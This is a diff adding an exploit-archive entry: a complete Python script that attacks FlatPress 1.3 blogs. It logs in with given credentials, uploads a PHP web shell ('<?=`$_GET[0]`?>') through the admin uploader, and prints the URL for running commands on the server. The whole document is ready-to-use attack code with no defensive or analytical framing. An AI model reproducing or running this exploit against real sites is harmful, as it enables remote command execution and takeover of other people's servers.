@@ -1,0 +1,85 @@
+id: 39567
+date: 04/21/2024
+title: FlatPress v1.3 - Remote Command Execution Exploit
+author: Ahmet Ümit BAYRAM
+cves: 
+
+# Exploit Title: FlatPress v1.3 - Remote Command Execution
+# Discovered by: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.flatpress.org
+# Software Link: https://github.com/flatpressblog/flatpress/archive/1.3.zip
+# Tested Version: 1.3 (latest)
+# Tested on: MacOS
+
+import requests
+import time
+import random
+import string
+
+def random_string(length=5):
+    """Rastgele bir string oluşturur."""
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(length))
+
+def login_and_upload(base_url, username, password):
+    filename = random_string() + ".php"
+    login_url = f"http://{base_url}/login.php"
+    upload_url = f"http://{base_url}/admin.php?p=uploader&action=default"
+
+    with requests.Session() as session:
+        # Exploiting
+        print("Exploiting...")
+        time.sleep(1)
+
+        # Giriş yapma denemesi
+        login_data = {
+        'user': username,
+        'pass': password,
+        'submit': 'Login'
+        }
+        print("Logging in...")
+        response = session.post(login_url, data=login_data)
+        time.sleep(1)
+
+        if "Logout" in response.text:
+            print("Login Successful!")
+        else:
+            print("Login Failed!")
+            print(response.text)
+            return
+
+        # Dosya yükleme denemesi
+        print("Shell uploading...")
+        time.sleep(1)
+
+        # Form verileri ve dosyalar
+        files = {
+        'upload[]': (filename, '<?=`$_GET[0]`?>', 'text/php'),
+        }
+        form_data = {
+        '_wpnonce': '9e0ed04260',
+        '_wp_http_referer': '/admin.php?p=uploader',
+        'upload': 'Upload'
+        }
+
+        response = session.post(upload_url, files=files, data=form_data)
+
+        if "File(s) uploaded" in response.text or "Upload" in response.text:
+            shell_url = f"http://{base_url}/fp-content/attachs/{filename}"
+            print(f"Your Shell is Ready: {shell_url}")
+            time.sleep(1)
+            print(f"Shell Usage: {shell_url}?0=command")
+        else:
+            print("Exploit Failed!")
+            print(response.status_code, response.text)
+
+# Örnek kullanım: python script.py siteadi.com username password
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) != 4:
+        print("Usage: script.py <base_url> <username> <password>")
+    else:
+        base_url, username, password = sys.argv[1:]
+        login_and_upload(base_url, username, password)
+
+#  0day.today [2024-04-24]  #
